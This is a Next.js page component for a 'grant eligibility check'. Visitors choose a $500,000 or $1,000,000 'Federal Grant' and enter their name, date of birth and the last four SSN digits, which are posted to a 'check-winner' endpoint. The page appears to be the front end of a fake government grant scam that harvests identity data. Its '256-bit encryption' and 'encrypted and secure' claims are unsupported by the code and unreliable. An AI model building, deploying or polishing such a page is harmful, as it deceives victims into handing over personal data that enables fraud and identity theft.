"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { motion } from "framer-motion"
import { Shield, Search, AlertCircle, Loader2, DollarSign } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"

export default function CheckPage() {
  const router = useRouter()
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [notFound, setNotFound] = useState(false)
  const [selectedGrant, setSelectedGrant] = useState<string>("")
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    dob: "",
    ssnLast4: "",
  })

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!selectedGrant) {
      setError("Please select a grant amount to continue.")
      return
    }
    setLoading(true)
    setError("")
    setNotFound(false)

    try {
      const res = await fetch("/api/check-winner", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ...formData, grantAmount: selectedGrant }),
      })

      const data = await res.json()

      if (data.found) {
        router.push(`/winner?id=${data.winner.id}&amount=${selectedGrant}`)
      } else {
        setNotFound(true)
      }
    } catch {
      setError("An error occurred. Please try again.")
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-[80vh] bg-gradient-to-b from-muted/30 to-background">
      <div className="mx-auto max-w-2xl px-4 py-16 sm:px-6 sm:py-24">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6 }}
          className="text-center mb-10"
        >
          <div className="mb-4 inline-flex items-center gap-2 rounded-full bg-primary/10 px-4 py-2">
            <Search className="h-4 w-4 text-primary" />
            <span className="text-sm font-semibold text-primary">Eligibility Check</span>
          </div>
          <h1 className="text-3xl font-bold tracking-tight sm:text-4xl">
            Check Your Eligibility
          </h1>
          <p className="mt-3 text-lg text-muted-foreground">
            Select your grant amount and enter your details below to verify eligibility.
          </p>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6, delay: 0.2 }}
        >
          <Card className="border-2 shadow-xl">
            <CardHeader className="pb-4">
              <div className="flex items-center gap-3">
                <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-primary text-primary-foreground">
                  <Shield className="h-5 w-5" />
                </div>
                <div>
                  <CardTitle className="text-xl">Eligibility Verification</CardTitle>
                  <CardDescription>Select your grant and verify your identity</CardDescription>
                </div>
              </div>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSubmit} className="space-y-6">
                {/* Grant Amount Selection */}
                <div className="space-y-3">
                  <Label className="text-base font-semibold flex items-center gap-2">
                    <DollarSign className="h-4 w-4 text-green-600" />
                    Select Grant Amount
                  </Label>
                  <div className="grid grid-cols-2 gap-4">
                    <button
                      type="button"
                      onClick={() => { setSelectedGrant("500000"); setError(""); }}
                      className={`relative rounded-xl border-2 p-5 text-center transition-all duration-200 hover:shadow-lg ${
                        selectedGrant === "500000"
                          ? "border-green-500 bg-green-50 shadow-lg shadow-green-500/10 ring-2 ring-green-500/20"
                          : "border-muted hover:border-green-300"
                      }`}
                    >
                      {selectedGrant === "500000" && (
                        <div className="absolute -top-2 -right-2 flex h-6 w-6 items-center justify-center rounded-full bg-green-500 text-white">
                          <svg xmlns="http://www.w3.org/2000/svg" className="h-3.5 w-3.5" viewBox="0 0 20 20" fill="currentColor">
                            <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                          </svg>
                        </div>
                      )}
                      <div className="text-2xl font-extrabold text-green-700">$500,000</div>
                      <div className="mt-1 text-xs text-muted-foreground font-medium">Federal Grant</div>
                    </button>
                    <button
                      type="button"
                      onClick={() => { setSelectedGrant("1000000"); setError(""); }}
                      className={`relative rounded-xl border-2 p-5 text-center transition-all duration-200 hover:shadow-lg ${
                        selectedGrant === "1000000"
                          ? "border-green-500 bg-green-50 shadow-lg shadow-green-500/10 ring-2 ring-green-500/20"
                          : "border-muted hover:border-green-300"
                      }`}
                    >
                      {selectedGrant === "1000000" && (
                        <div className="absolute -top-2 -right-2 flex h-6 w-6 items-center justify-center rounded-full bg-green-500 text-white">
                          <svg xmlns="http://www.w3.org/2000/svg" className="h-3.5 w-3.5" viewBox="0 0 20 20" fill="currentColor">
                            <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                          </svg>
                        </div>
                      )}
                      <div className="text-2xl font-extrabold text-green-700">$1,000,000</div>
                      <div className="mt-1 text-xs text-muted-foreground font-medium">Federal Grant</div>
                    </button>
                  </div>
                </div>

                {/* Divider */}
                <div className="relative">
                  <div className="absolute inset-0 flex items-center">
                    <div className="w-full border-t border-muted" />
                  </div>
                  <div className="relative flex justify-center">
                    <span className="bg-card px-3 text-xs font-medium text-muted-foreground uppercase tracking-wider">Personal Information</span>
                  </div>
                </div>

                <div className="grid gap-5 sm:grid-cols-2">
                  <div className="space-y-2">
                    <Label htmlFor="firstName" className="text-base">First Name</Label>
                    <Input
                      id="firstName"
                      placeholder="e.g. John"
                      value={formData.firstName}
                      onChange={(e) => setFormData({ ...formData, firstName: e.target.value })}
                      required
                      className="text-base"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="lastName" className="text-base">Last Name</Label>
                    <Input
                      id="lastName"
                      placeholder="e.g. Doe"
                      value={formData.lastName}
                      onChange={(e) => setFormData({ ...formData, lastName: e.target.value })}
                      required
                      className="text-base"
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="dob" className="text-base">Date of Birth</Label>
                  <Input
                    id="dob"
                    type="date"
                    value={formData.dob}
                    onChange={(e) => setFormData({ ...formData, dob: e.target.value })}
                    required
                    className="text-base"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="ssnLast4" className="text-base">Last 4 Digits of SSN</Label>
                  <Input
                    id="ssnLast4"
                    placeholder="e.g. 1234"
                    maxLength={4}
                    pattern="[0-9]{4}"
                    value={formData.ssnLast4}
                    onChange={(e) => setFormData({ ...formData, ssnLast4: e.target.value.replace(/\D/g, "").slice(0, 4) })}
                    required
                    className="text-base"
                  />
                  <p className="text-xs text-muted-foreground">Your information is encrypted and secure</p>
                </div>

                {error && (
                  <div className="flex items-center gap-2 rounded-lg bg-destructive/10 p-3 text-sm text-destructive">
                    <AlertCircle className="h-4 w-4 shrink-0" />
                    {error}
                  </div>
                )}

                {notFound && (
                  <motion.div
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="rounded-xl border-2 border-orange-200 bg-orange-50 p-6 text-center"
                  >
                    <div className="mb-3 text-4xl">😔</div>
                    <h3 className="mb-2 text-lg font-bold text-orange-900">Not Found</h3>
                    <p className="text-sm text-orange-700">
                      We could not find a matching grant record. Please verify your information and try again,
                      or contact our support team for assistance.
                    </p>
                  </motion.div>
                )}

                <Button type="submit" size="xl" className="w-full rounded-xl text-lg" disabled={loading}>
                  {loading ? (
                    <>
                      <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                      Checking...
                    </>
                  ) : (
                    <>
                      <Search className="mr-2 h-5 w-5" />
                      Check Eligibility
                    </>
                  )}
                </Button>
              </form>
            </CardContent>
          </Card>
        </motion.div>

        <motion.p
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.5 }}
          className="mt-6 text-center text-sm text-muted-foreground"
        >
          🔒 Your personal information is protected with 256-bit encryption
        </motion.p>
      </div>
    </div>
  )
}
